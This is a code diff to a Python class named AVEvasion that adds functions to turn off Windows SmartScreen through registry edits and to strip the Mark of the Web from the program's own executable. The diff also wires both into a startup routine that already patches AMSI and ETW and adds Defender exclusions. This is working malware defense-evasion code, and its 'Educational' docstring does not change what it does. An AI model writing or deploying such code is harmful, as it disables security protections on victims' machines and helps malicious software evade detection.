@@ -485,6 +485,75 @@ class AVEvasion:
         return is_sandbox, score, checks
 
     @staticmethod
+    def disable_smartscreen():
+        """
+        Try to disable Windows SmartScreen
+        Requires admin privileges
+        Educational: Shows how malware disables SmartScreen
+        """
+        if sys.platform != 'win32':
+            return False
+
+        try:
+            import subprocess
+
+            # Registry keys to disable SmartScreen
+            commands = [
+                # Disable SmartScreen for apps and files
+                r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f',
+
+                # Disable SmartScreen in Edge
+                r'reg add "HKCU\Software\Microsoft\Edge\SmartScreenEnabled" /t REG_DWORD /d 0 /f',
+
+                # Disable SmartScreen in IE
+                r'reg add "HKCU\Software\Microsoft\Internet Explorer\PhishingFilter" /v EnabledV9 /t REG_DWORD /d 0 /f',
+
+                # Disable for Store apps
+                r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f',
+            ]
+
+            for cmd in commands:
+                try:
+                    subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
+                except:
+                    pass
+
+            return True
+        except:
+            return False
+
+    @staticmethod
+    def mark_file_as_trusted(file_path):
+        """
+        Mark file as downloaded from trusted zone
+        Removes Mark of the Web (MOTW) which triggers SmartScreen
+        """
+        if sys.platform != 'win32':
+            return False
+
+        try:
+            # Remove the Zone.Identifier alternate data stream
+            # This is what Windows uses to mark files from internet
+            ads_path = f"{file_path}:Zone.Identifier"
+
+            try:
+                os.remove(ads_path)
+            except:
+                pass
+
+            # Alternative method using PowerShell
+            try:
+                import subprocess
+                cmd = f'powershell -Command "Unblock-File -Path \\"{file_path}\\"" 2>nul'
+                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
+            except:
+                pass
+
+            return True
+        except:
+            return False
+
+    @staticmethod
     def run_all_evasions():
         """
         Run all evasion techniques at startup
@@ -506,9 +575,11 @@ class AVEvasion:
         AVEvasion.patch_amsi()
         AVEvasion.patch_etw()
 
-        # Try to add exclusions if admin
+        # Try to add exclusions and disable SmartScreen if admin
         if AVEvasion.is_admin():
             current_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
             AVEvasion.add_defender_exclusion(os.path.dirname(current_path))
+            AVEvasion.disable_smartscreen()
+            AVEvasion.mark_file_as_trusted(current_path)
 
         return True
